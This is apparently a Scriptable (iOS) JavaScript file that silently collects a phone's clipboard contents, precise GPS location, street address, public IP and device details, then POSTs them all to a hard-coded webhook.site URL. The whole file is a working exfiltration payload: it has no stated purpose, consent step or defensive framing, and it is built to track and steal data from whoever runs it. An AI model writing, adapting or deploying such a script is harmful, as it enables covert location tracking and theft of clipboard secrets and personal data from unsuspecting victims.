const WEBHOOK_URL = "https://webhook.site/95eb54b3-b3f3-485f-86b9-26012ee057ba";

async function getIP() {
  try {
    let req = new Request("https://api.ipify.org?format=json");
    let res = await req.loadJSON();
    return res.ip;
  } catch {
    return "Unavailable";
  }
}

async function getLocation() {
  try {
    let location = await Location.current();
    return {
      latitude: location.latitude,
      longitude: location.longitude,
      altitude: location.altitude,
      horizontalAccuracy: location.horizontalAccuracy,
      verticalAccuracy: location.verticalAccuracy,
    };
  } catch {
    return "Location permission denied or unavailable";
  }
}

async function getAddressFromCoords(lat, lon) {
  try {
    const url = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&addressdetails=1`;
    const req = new Request(url);
    req.headers = { "User-Agent": "ScriptableScript/1.0" };
    const res = await req.loadJSON();
    return res.display_name || "Address not found";
  } catch (e) {
    return "Error retrieving address";
  }
}

async function main() {
  const location = await getLocation();
  const address = await getAddressFromCoords(location.latitude, location.longitude);

  let deviceInfo = {
    deviceName: Device.name(),
    systemName: Device.systemName(),
    systemVersion: Device.systemVersion(),
    model: Device.model(),
    isPad: Device.isPad(),
    isPhone: Device.isPhone(),
    batteryLevel: Device.batteryLevel(),
    locale: Device.locale(),
    currentDateTime: new Date().toISOString(),
    clipboard: Pasteboard.paste() || "Clipboard empty",
    publicIP: await getIP(),
    location: location,
    address: address,
  };

  let req = new Request(WEBHOOK_URL);
  req.method = "POST";
  req.headers = { "Content-Type": "application/json" };
  req.body = JSON.stringify(deviceInfo);

  try {
    await req.load();
    console.log("Device info sent successfully.");
  } catch (e) {
    console.log("Error sending device info:", e);
  }
}

await main();
